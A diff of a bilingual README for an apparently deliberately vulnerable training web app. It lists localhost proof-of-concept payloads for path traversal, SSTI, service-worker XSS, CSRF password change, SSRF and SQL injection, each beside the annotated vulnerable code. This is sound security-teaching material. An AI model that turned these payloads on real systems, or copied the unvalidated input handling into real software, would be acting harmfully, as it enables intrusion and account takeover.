@@ -76,46 +76,88 @@ Vulnerable code:
 cookie = request.cookies.get('user_id') #<--значение cookie не проверяется
 ```
 
-
-# PATH TRAVERSAL
-открыть код и найти каким образом идет обращение к картинке
-'view-source:http://localhost:8888/path_travers'
-'<img src="/path_travers_img/?img=/static/scripting.png" alt="what_is_that" width="100" height="100"></p>'
-
-exploit
-```URL
-http://localhost:8888/path-travers-img/?img=/static/scripting.png
-http://localhost:8888/path_travers_img/?img=/README.md
-http://localhost:8888/path_travers_img/?img=/../venv.txt
+## Path traversal
+Exploit/PoC:
+```
+1. Open view-source http://localhost:8888/path_travers
+2. Observe the path: <img src="/path_travers_img/?img=/static/scripting.png" alt="what_is_that" width="100" height="100"></p>
+3. Try:
+/../<your_local_file>
+/README.md
+/static/scripting.png
+```
+Vulnerable code:
+```
+# modules/path_travers.py
+image_path = f"{root_folder()}{file_path}" # --> dangerous command root_folder() and get user {file_path} input without validation
 ```
 
-# SSTI 
-exploit
-```URL
-http://localhost:8888/ssti?param={{(9*9)}}
-http://localhost:8888/ssti?param={{%20config.items()%20}}
+## SSTI 
+Exploit/PoC:
+```
+Go to: http://localhost:8888/ssti
+Try payload:
+?param={{(9*9)}}
+?param={{%20config.items()%20}}
 ```
 
-# XSS via Service worker
-/upload
-
-PoC upload sw.js
-```js
-setInterval(function() {
-  console.log("U been h@cked");
-}, 5000);
+Vulnerable code:
+```
+# modules/ssti.py
+user_input = request.args.get('param', 'Введите данные в query "?param="') #<-- точка ввода через query параметры xss reflected + SSTI
+return render_template_string(template) #<-- небезопасный вывод пользователю данных без санитизации
+</b>'''+user_input+'''</pre> #<-- небезопасный вывод пользователю данных без санитизации
 ```
 
-# CSRF
-/csrf через другую вкладку
-python3 -m http.server 9000
-Фишинговая ссылка hacker_csrf.html
-http://127.0.0.1:9000/Projects/FVA/hacker_csrf.html
+## XSS via Service worker
+Exploit/PoC:
+```
+1. Go to /upload  
+2. Use payload /sw.js: `setInterval(function(){console.log("U been h@cked");}, 5000);`
+3. Refresh page
+```
 
-/csrf через GET
-http://localhost:8888/change_password?id=1&new_password=h@cked
+Vulnerable code:
+```
+# templates/upload.html
+<script>
+      if (navigator.serviceWorker) {
+        navigator.serviceWorker.register('/static/sw.js').then(function(registration) {
+          console.log('Service Worker registered:', registration.scope);
+        }).catch(function(error) {
+          console.error('Service Worker registration failed:', error);
+        });
+      }
+    </script>
+# main.py
+file.save(os.path.join(FVA.static_folder, filename)) #<-- user input without proper validation
+```
 
-# SSRF
+## CSRF
+Exploit/PoC:
+```
+1. Create phishing web server `python -m http.server`
+2. Host payload /hacker_csrf.html
+3. Provide to victim phishing URL (user action: click)
+4. Check passwords
+
+OR
+1. Create phishing URL link http://{URL}/ssrf?url=http://localhost:8888/xss
+2. Provide to victim phishing URL (user action: click)
+3. Check passwords
+```
+
+Vulnerable code:
+```
+# modules/csrf.py
+@csrf_bp.route('/change_password', methods=['POST', 'GET']) #<-- critical actions mist be exucuted via POST request
+if request.method == 'GET': #<-- critical actions mist be exucuted via POST request
+new_password = str(request.args.get('new_password')) #<-- no info from fronend that this is user actions
+```
+
+## SSRF
+Exploit/PoC:
+Vulnerable code:
 GET request: 
 http://localhost:8888/ssrf?url=http://localhost:8888/xss
 
@@ -124,6 +166,8 @@ curl -X POST -d "url=http://localhost:8888/xss" http://localhost:8888/ssrf
 
 
 # SQl injection
+Exploit/PoC:
+Vulnerable code:
 brew services start postgresql
 psgl postgres
 python init_db.py from modules.init_db import create_database
@@ -135,10 +179,17 @@ login: ' OR 1=1; --
 password: any
 
 # command_injection
+Exploit/PoC:
+Vulnerable code:
+
 /go to command_injection
 change cookie to admin > base64
 
-# CORS test
+## Security misconfiguration
+#### CORS
+Exploit/PoC:
+Vulnerable code:
+
 python -m http.server 8000
 devtools > console:
 fetch('http://localhost:8888/api/users')
